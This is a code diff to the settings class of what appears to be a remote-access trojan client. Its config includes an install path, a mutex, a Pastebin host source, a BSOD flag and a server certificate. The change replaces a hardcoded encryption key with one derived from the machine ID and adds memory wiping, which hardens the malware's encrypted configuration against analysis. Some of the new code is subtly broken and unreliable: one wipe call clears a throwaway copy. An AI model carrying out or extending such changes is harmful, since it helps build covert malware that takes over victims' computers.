@@ -17,13 +17,14 @@ namespace Client
         public static string In_stall = "false";
         public static string Install_Folder = "AppData";
         public static string Install_File = "Test.exe";
-        public static string Key = "qwqdanchun";
+        // Note: Key is now derived from HWID, not hardcoded
+        public static string Key = null; // Will be set in InitializeSettings()
         public static string MTX = "%MTX%";
         public static string Certifi_cate = "%Certificate%";
         public static string Server_signa_ture = "%Serversignature%";
         public static X509Certificate2 Server_Certificate;
         public static Aes256Enhanced aes256Enhanced;
-        public static Aes256 aes256 = new Aes256(Key);
+        public static Aes256 aes256;
         public static string Paste_bin = "null";
         public static string BS_OD = "false";
         public static string Hw_id = HwidGen.HWID();
@@ -59,16 +60,38 @@ namespace Client
         public static bool InitializeSettings()
         {
 #if DEBUG
+            // In debug mode, derive key from HWID for security
+            byte[] derivedKeyBytes = SecureKeyDerivation.DeriveKey("DebugEncryption", 32);
+            Key = Convert.ToBase64String(derivedKeyBytes);
+            aes256 = new Aes256(Key);
+            aes256Enhanced = new Aes256Enhanced(Key);
+            SecureKeyDerivation.WipeKey(derivedKeyBytes); // Clean up
             return true;
 #endif
             try
             {
-                Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
+                // Decode builder-provided key
+                string builderKey = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
+                
+                // Derive actual encryption key from builder key + HWID
+                byte[] derivedKey = SecureKeyDerivation.DeriveFromBuilderKey(builderKey, "MainEncryption");
+                if (derivedKey == null || !SecureKeyDerivation.ValidateKey(derivedKey))
+                {
+                    Logger.Error("Failed to derive valid encryption key", null);
+                    return false;
+                }
+                
+                Key = Convert.ToBase64String(derivedKey);
                 
                 // Initialize both encryption systems
                 aes256 = new Aes256(Key);
                 aes256Enhanced = new Aes256Enhanced(Key);
                 
+                // Wipe sensitive data from memory
+                SecureKeyDerivation.WipeKey(derivedKey);
+                Array.Clear(Encoding.UTF8.GetBytes(builderKey), 0, builderKey.Length);
+                
+                // Decrypt configuration
                 Por_ts = aes256.Decrypt(Por_ts);
                 Hos_ts = aes256.Decrypt(Hos_ts);
                 Ver_sion = aes256.Decrypt(Ver_sion);
@@ -82,9 +105,14 @@ namespace Client
                 Hw_id = HwidGen.HWID();
                 Server_signa_ture = aes256.Decrypt(Server_signa_ture);
                 Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
+                
                 return VerifyHash();
             }
-            catch { return false; }
+            catch (Exception ex)
+            { 
+                Logger.Error("Settings initialization failed", ex);
+                return false; 
+            }
         }
         private static bool VerifyHash()
         {
